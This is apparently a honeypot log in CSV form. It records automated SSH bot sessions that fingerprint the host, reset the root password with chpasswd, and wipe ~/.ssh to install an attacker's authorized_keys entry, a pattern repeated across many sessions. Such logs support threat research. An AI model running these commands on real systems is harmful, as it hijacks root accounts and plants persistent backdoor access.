id,session,timestamp,realm,input
32292,5a7402cb1e6d,2022-11-18T12:00:24.746859Z,,"cat /proc/cpuinfo | grep name | wc -l"
32293,5a7402cb1e6d,2022-11-18T12:00:25.046136Z,,"echo ""root:kFiuRYo4pMwB""|chpasswd|bash"
32294,5a7402cb1e6d,2022-11-18T12:00:25.300250Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32295,5a7402cb1e6d,2022-11-18T12:00:25.513884Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32296,5a7402cb1e6d,2022-11-18T12:00:25.801749Z,,"which ls"
32297,5a7402cb1e6d,2022-11-18T12:00:25.801022Z,,"ls -lh $(which ls)"
32298,5a7402cb1e6d,2022-11-18T12:00:26.011440Z,,"crontab -l"
32299,5a7402cb1e6d,2022-11-18T12:00:26.292321Z,,w
32300,5a7402cb1e6d,2022-11-18T12:00:26.543628Z,,"uname -m"
32301,5a7402cb1e6d,2022-11-18T12:00:26.751038Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32302,5a7402cb1e6d,2022-11-18T12:00:28.122882Z,,top
32303,5a7402cb1e6d,2022-11-18T12:00:28.328245Z,,uname
32304,5a7402cb1e6d,2022-11-18T12:00:28.609947Z,,"uname -a"
32305,5a7402cb1e6d,2022-11-18T12:00:28.854086Z,,"lscpu | grep Model"
32306,5a7402cb1e6d,2022-11-18T12:00:29.064772Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32307,a18ea29b52bb,2022-11-18T12:01:55.639866Z,,"cat /proc/cpuinfo | grep name | wc -l"
32308,a18ea29b52bb,2022-11-18T12:01:56.104234Z,,"echo ""root:fEUHU7ZaK8ZK""|chpasswd|bash"
32309,a18ea29b52bb,2022-11-18T12:01:56.508654Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32310,a18ea29b52bb,2022-11-18T12:01:56.996468Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32311,a18ea29b52bb,2022-11-18T12:01:57.429062Z,,"which ls"
32312,a18ea29b52bb,2022-11-18T12:01:57.427954Z,,"ls -lh $(which ls)"
32313,a18ea29b52bb,2022-11-18T12:01:57.917350Z,,"crontab -l"
32314,a18ea29b52bb,2022-11-18T12:01:58.947507Z,,w
32315,a18ea29b52bb,2022-11-18T12:01:59.543339Z,,"uname -m"
32316,a18ea29b52bb,2022-11-18T12:02:00.351412Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32317,a18ea29b52bb,2022-11-18T12:02:00.756850Z,,top
32318,a18ea29b52bb,2022-11-18T12:02:01.237161Z,,uname
32319,a18ea29b52bb,2022-11-18T12:02:01.718519Z,,"uname -a"
32320,a18ea29b52bb,2022-11-18T12:02:02.145015Z,,"lscpu | grep Model"
32321,a18ea29b52bb,2022-11-18T12:02:02.637591Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32322,928bd56d5734,2022-11-18T12:02:36.576148Z,,"uname -a"
32323,f559475c9188,2022-11-18T12:02:36.600919Z,,"uname -a"
32324,a15dcb85666d,2022-11-18T12:02:36.680536Z,,"uname -a"
32325,e718506fb5dc,2022-11-18T12:02:36.711818Z,,"uname -a"
32326,30a262986890,2022-11-18T12:02:36.815414Z,,"uname -a"
32327,2007dc86ef59,2022-11-18T12:02:36.956294Z,,"uname -a"
32328,61af23fbce14,2022-11-18T12:02:36.987975Z,,"uname -a"
32329,04c90c2ab53b,2022-11-18T12:02:37.158296Z,,"uname -a"
32330,83d819964832,2022-11-18T12:02:37.191864Z,,"uname -a"
32331,88a2889adae3,2022-11-18T12:02:37.402608Z,,"uname -a"
32332,6bb891ff9e1a,2022-11-18T12:02:37.434864Z,,"uname -a"
32333,795f6e17eeed,2022-11-18T12:02:50.934353Z,,"cat /proc/cpuinfo | grep name | wc -l"
32334,795f6e17eeed,2022-11-18T12:02:52.025730Z,,"echo ""root:GabrMLLzTFoe""|chpasswd|bash"
32335,795f6e17eeed,2022-11-18T12:02:52.724375Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32336,795f6e17eeed,2022-11-18T12:02:53.630457Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32337,795f6e17eeed,2022-11-18T12:02:54.459915Z,,"which ls"
32338,795f6e17eeed,2022-11-18T12:02:54.459189Z,,"ls -lh $(which ls)"
32339,795f6e17eeed,2022-11-18T12:02:55.319044Z,,"crontab -l"
32340,795f6e17eeed,2022-11-18T12:02:56.339373Z,,w
32341,795f6e17eeed,2022-11-18T12:02:57.439195Z,,"uname -m"
32342,795f6e17eeed,2022-11-18T12:02:58.303666Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32343,795f6e17eeed,2022-11-18T12:02:59.246873Z,,top
32344,795f6e17eeed,2022-11-18T12:03:00.115879Z,,uname
32345,795f6e17eeed,2022-11-18T12:03:01.036419Z,,"uname -a"
32346,795f6e17eeed,2022-11-18T12:03:02.045794Z,,"lscpu | grep Model"
32347,795f6e17eeed,2022-11-18T12:03:03.216017Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32348,d68274fa46b9,2022-11-18T12:04:00.285569Z,,"cat /proc/cpuinfo | grep name | wc -l"
32349,d68274fa46b9,2022-11-18T12:04:00.801902Z,,"echo ""root:vmk5tUspbZWZ""|chpasswd|bash"
32350,d68274fa46b9,2022-11-18T12:04:01.392336Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32351,d68274fa46b9,2022-11-18T12:04:01.947821Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32352,d68274fa46b9,2022-11-18T12:04:02.465000Z,,"which ls"
32353,d68274fa46b9,2022-11-18T12:04:02.464123Z,,"ls -lh $(which ls)"
32354,d68274fa46b9,2022-11-18T12:04:03.054467Z,,"crontab -l"
32355,d68274fa46b9,2022-11-18T12:04:03.570578Z,,w
32356,d68274fa46b9,2022-11-18T12:04:04.164996Z,,"uname -m"
32357,d68274fa46b9,2022-11-18T12:04:04.722445Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32358,d68274fa46b9,2022-11-18T12:04:05.239388Z,,top
32359,d68274fa46b9,2022-11-18T12:04:05.835151Z,,uname
32360,d68274fa46b9,2022-11-18T12:04:06.391079Z,,"uname -a"
32361,d68274fa46b9,2022-11-18T12:04:06.905736Z,,"lscpu | grep Model"
32362,d68274fa46b9,2022-11-18T12:04:07.500283Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32363,3bc3453faa67,2022-11-18T12:07:21.955061Z,,"cat /proc/cpuinfo | grep name | wc -l"
32364,3bc3453faa67,2022-11-18T12:07:22.229947Z,,"echo ""root:Z1Q9zF8ro7ZV""|chpasswd|bash"
32365,3bc3453faa67,2022-11-18T12:07:22.451284Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32366,3bc3453faa67,2022-11-18T12:07:22.632733Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32367,3bc3453faa67,2022-11-18T12:07:22.893139Z,,"which ls"
32368,3bc3453faa67,2022-11-18T12:07:22.892373Z,,"ls -lh $(which ls)"
32369,3bc3453faa67,2022-11-18T12:07:23.084183Z,,"crontab -l"
32370,3bc3453faa67,2022-11-18T12:07:23.354881Z,,w
32371,3bc3453faa67,2022-11-18T12:07:23.589518Z,,"uname -m"
32372,3bc3453faa67,2022-11-18T12:07:23.774300Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32373,3bc3453faa67,2022-11-18T12:07:24.064194Z,,top
32374,3bc3453faa67,2022-11-18T12:07:24.258465Z,,uname
32375,3bc3453faa67,2022-11-18T12:07:24.519075Z,,"uname -a"
32376,3bc3453faa67,2022-11-18T12:07:24.739722Z,,"lscpu | grep Model"
32377,3bc3453faa67,2022-11-18T12:07:24.928093Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32378,74617a73cf0b,2022-11-18T12:07:34.926647Z,,"cat /proc/cpuinfo | grep name | wc -l"
32379,74617a73cf0b,2022-11-18T12:07:35.190920Z,,"echo ""root:6W37cAQIiaja""|chpasswd|bash"
32380,74617a73cf0b,2022-11-18T12:07:35.407198Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32381,74617a73cf0b,2022-11-18T12:07:35.707128Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32382,74617a73cf0b,2022-11-18T12:07:35.928347Z,,"which ls"
32383,74617a73cf0b,2022-11-18T12:07:35.927534Z,,"ls -lh $(which ls)"
32384,74617a73cf0b,2022-11-18T12:07:36.228215Z,,"crontab -l"
32385,74617a73cf0b,2022-11-18T12:07:36.491633Z,,w
32386,74617a73cf0b,2022-11-18T12:07:36.711080Z,,"uname -m"
32387,74617a73cf0b,2022-11-18T12:07:37.016122Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32388,74617a73cf0b,2022-11-18T12:07:37.236156Z,,top
32389,74617a73cf0b,2022-11-18T12:07:37.531168Z,,uname
32390,74617a73cf0b,2022-11-18T12:07:37.793160Z,,"uname -a"
32391,74617a73cf0b,2022-11-18T12:07:38.009849Z,,"lscpu | grep Model"
32392,74617a73cf0b,2022-11-18T12:07:38.308222Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32393,b34a908dac28,2022-11-18T12:08:03.796848Z,,"cat /proc/cpuinfo | grep name | wc -l"
32394,b34a908dac28,2022-11-18T12:08:04.411789Z,,"echo ""root:IRPgqTVl4fXa""|chpasswd|bash"
32395,b34a908dac28,2022-11-18T12:08:04.976778Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32396,b34a908dac28,2022-11-18T12:08:05.502938Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32397,b34a908dac28,2022-11-18T12:08:06.112516Z,,"which ls"
32398,b34a908dac28,2022-11-18T12:08:06.111722Z,,"ls -lh $(which ls)"
32399,b34a908dac28,2022-11-18T12:08:06.679165Z,,"crontab -l"
32400,b34a908dac28,2022-11-18T12:08:07.206401Z,,w
32401,b34a908dac28,2022-11-18T12:08:07.815688Z,,"uname -m"
32402,b34a908dac28,2022-11-18T12:08:08.344781Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32403,b34a908dac28,2022-11-18T12:08:08.947565Z,,top
32404,b34a908dac28,2022-11-18T12:08:09.514406Z,,uname
32405,b34a908dac28,2022-11-18T12:08:10.042243Z,,"uname -a"
32406,b34a908dac28,2022-11-18T12:08:10.644925Z,,"lscpu | grep Model"
32407,b34a908dac28,2022-11-18T12:08:11.169510Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32408,20f7fd0d38ea,2022-11-18T12:08:38.660831Z,,"cat /proc/cpuinfo | grep name | wc -l"
32409,20f7fd0d38ea,2022-11-18T12:08:39.953615Z,,"echo ""root:r71cSvvEQdJM""|chpasswd|bash"
32410,20f7fd0d38ea,2022-11-18T12:08:41.005803Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32411,20f7fd0d38ea,2022-11-18T12:08:41.829973Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32412,20f7fd0d38ea,2022-11-18T12:08:42.530731Z,,"which ls"
32413,20f7fd0d38ea,2022-11-18T12:08:42.529768Z,,"ls -lh $(which ls)"
32414,20f7fd0d38ea,2022-11-18T12:08:43.306549Z,,"crontab -l"
32415,20f7fd0d38ea,2022-11-18T12:08:44.041830Z,,w
32416,20f7fd0d38ea,2022-11-18T12:08:44.741806Z,,"uname -m"
32417,20f7fd0d38ea,2022-11-18T12:08:45.535847Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32418,97051ccd5554,2022-11-18T12:08:46.078700Z,,"cat /proc/cpuinfo | grep name | wc -l"
32419,20f7fd0d38ea,2022-11-18T12:08:46.235211Z,,top
32420,97051ccd5554,2022-11-18T12:08:46.644601Z,,"echo ""root:1pIskt92W7Rw""|chpasswd|bash"
32421,20f7fd0d38ea,2022-11-18T12:08:46.979023Z,,uname
32422,97051ccd5554,2022-11-18T12:08:47.433707Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32423,20f7fd0d38ea,2022-11-18T12:08:47.772151Z,,"uname -a"
32424,97051ccd5554,2022-11-18T12:08:47.849185Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32425,97051ccd5554,2022-11-18T12:08:48.366913Z,,"which ls"
32426,97051ccd5554,2022-11-18T12:08:48.366174Z,,"ls -lh $(which ls)"
32427,20f7fd0d38ea,2022-11-18T12:08:48.472796Z,,"lscpu | grep Model"
32428,97051ccd5554,2022-11-18T12:08:48.833614Z,,"crontab -l"
32429,97051ccd5554,2022-11-18T12:08:49.311844Z,,w
32430,20f7fd0d38ea,2022-11-18T12:08:49.280154Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32431,97051ccd5554,2022-11-18T12:08:49.778456Z,,"uname -m"
32432,97051ccd5554,2022-11-18T12:08:50.201193Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32433,97051ccd5554,2022-11-18T12:08:50.689078Z,,top
32434,97051ccd5554,2022-11-18T12:08:51.139122Z,,uname
32435,97051ccd5554,2022-11-18T12:08:51.547907Z,,"uname -a"
32436,97051ccd5554,2022-11-18T12:08:52.040681Z,,"lscpu | grep Model"
32437,97051ccd5554,2022-11-18T12:08:52.456219Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32438,9580bdcaf6b1,2022-11-18T12:11:00.278625Z,,"cat /proc/cpuinfo | grep name | wc -l"
32439,9580bdcaf6b1,2022-11-18T12:11:00.790562Z,,"echo ""root:EUqQ8koUEuL0""|chpasswd|bash"
32440,9580bdcaf6b1,2022-11-18T12:11:02.316405Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32441,9580bdcaf6b1,2022-11-18T12:11:02.805952Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32442,9580bdcaf6b1,2022-11-18T12:11:03.944369Z,,"which ls"
32443,9580bdcaf6b1,2022-11-18T12:11:03.943647Z,,"ls -lh $(which ls)"
32444,9580bdcaf6b1,2022-11-18T12:11:04.372755Z,,"crontab -l"
32445,9580bdcaf6b1,2022-11-18T12:11:04.879466Z,,w
32446,9580bdcaf6b1,2022-11-18T12:11:05.305363Z,,"uname -m"
32447,9580bdcaf6b1,2022-11-18T12:11:05.796389Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32448,9580bdcaf6b1,2022-11-18T12:11:06.255689Z,,top
32449,9580bdcaf6b1,2022-11-18T12:11:06.674223Z,,uname
32450,9580bdcaf6b1,2022-11-18T12:11:07.181432Z,,"uname -a"
32451,9580bdcaf6b1,2022-11-18T12:11:07.605106Z,,"lscpu | grep Model"
32452,9580bdcaf6b1,2022-11-18T12:11:08.133481Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32453,9e1e2994a216,2022-11-18T12:14:05.427144Z,,"cat /proc/cpuinfo | grep name | wc -l"
32454,9e1e2994a216,2022-11-18T12:14:05.976233Z,,"echo ""root:GvsF2GdZhs24""|chpasswd|bash"
32455,9e1e2994a216,2022-11-18T12:14:06.604501Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32456,9e1e2994a216,2022-11-18T12:14:07.194824Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32457,9e1e2994a216,2022-11-18T12:14:07.750738Z,,"which ls"
32458,9e1e2994a216,2022-11-18T12:14:07.749686Z,,"ls -lh $(which ls)"
32459,9e1e2994a216,2022-11-18T12:14:08.375445Z,,"crontab -l"
32460,9e1e2994a216,2022-11-18T12:14:08.927546Z,,w
32461,9e1e2994a216,2022-11-18T12:14:09.554296Z,,"uname -m"
32462,9e1e2994a216,2022-11-18T12:14:10.144727Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32463,9e1e2994a216,2022-11-18T12:14:10.696317Z,,top
32464,9e1e2994a216,2022-11-18T12:14:11.331766Z,,uname
32465,9e1e2994a216,2022-11-18T12:14:11.885009Z,,"uname -a"
32466,9e1e2994a216,2022-11-18T12:14:12.515372Z,,"lscpu | grep Model"
32467,9e1e2994a216,2022-11-18T12:14:13.104570Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32468,e3165c1b5f03,2022-11-18T12:17:18.321018Z,,"cat /proc/cpuinfo | grep name | wc -l"
32469,e3165c1b5f03,2022-11-18T12:17:19.351789Z,,"echo ""root:npsKnH1T9nzC""|chpasswd|bash"
32470,e3165c1b5f03,2022-11-18T12:17:20.306747Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32471,e3165c1b5f03,2022-11-18T12:17:21.439842Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32472,e3165c1b5f03,2022-11-18T12:17:22.639349Z,,"which ls"
32473,e3165c1b5f03,2022-11-18T12:17:22.638141Z,,"ls -lh $(which ls)"
32474,e3165c1b5f03,2022-11-18T12:17:23.813021Z,,"crontab -l"
32475,e3165c1b5f03,2022-11-18T12:17:25.044240Z,,w
32476,e3165c1b5f03,2022-11-18T12:17:26.342578Z,,"uname -m"
32477,e3165c1b5f03,2022-11-18T12:17:28.005544Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32478,e3165c1b5f03,2022-11-18T12:17:29.070835Z,,top
32479,e3165c1b5f03,2022-11-18T12:17:34.359733Z,,uname
32480,e3165c1b5f03,2022-11-18T12:17:35.141025Z,,"uname -a"
32481,e3165c1b5f03,2022-11-18T12:17:35.883106Z,,"lscpu | grep Model"
